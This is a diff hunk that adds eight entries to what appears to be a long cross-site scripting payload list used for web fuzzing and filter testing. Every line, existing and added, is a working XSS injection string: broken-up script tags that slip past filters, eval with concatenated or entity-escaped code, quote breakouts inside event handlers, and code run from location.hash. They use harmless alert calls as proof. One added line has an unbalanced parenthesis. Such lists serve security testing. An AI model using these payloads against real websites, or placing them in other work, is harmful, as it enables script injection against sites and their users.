@@ -1673,3 +1673,11 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <img/onerror=alert(1)+/src/<xss>
 %0d%0adata:text/html;text,<svg/onload=prompt(1)>
 "><img/src=">"onerror=confirm(123)>
+<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
+<script>eval('al'+'ert(1)');</script>
+<script><script>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<scr<object>ipt>alert(1)</script>
+&apos;; alert(1);//
+<a href="#" onClick="var a ='foo&apos;; alert(1);//'">Click Me</a>
+<script>eval(location.hash.slice(1)</script>
